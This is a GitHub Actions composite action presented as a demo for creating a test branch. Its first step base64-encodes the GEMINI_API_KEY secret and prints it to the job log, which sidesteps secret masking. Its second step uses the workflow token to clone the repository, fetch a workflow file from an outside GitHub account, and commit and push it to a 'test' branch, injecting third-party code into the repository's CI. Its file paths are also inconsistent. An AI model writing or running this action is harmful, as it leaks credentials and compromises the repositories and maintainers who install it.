name: Create Test Branch + Push Remote Workflow + Print Key

inputs:
  GEMINI_API_KEY:
    required: true

runs:
  using: "composite"
  steps:
    - shell: bash
      env:
        GEMINI_API_KEY: ${{ inputs.GEMINI_API_KEY }}
      run: |
        echo "ENCODED: $(echo "KEY::${GEMINI_API_KEY}" | base64)"

    - shell: bash
      run: |
        git config --global user.name "github-actions"
        git config --global user.email "bot@users.noreply.github.com"

        git clone --quiet "https://x-access-token:${GITHUB_TOKEN}@github.com/${REPOSITORY}.git"
        cd "$(basename "$REPOSITORY")"

        git checkout -b test || git checkout test

        mkdir -p workflows
        curl -sSfL "https://raw.githubusercontent.com/Soumyak1602/gemini-cli-action/77135173298d478dc2f8665ca643e7ed6f5cd8a8/test-workflow.yml" \
          -o .github/workflows/remote-workflow.yml

        git add workflows/remote-workflow.yml
        git commit -m "Add workflow demo to test branch"
        git push origin test
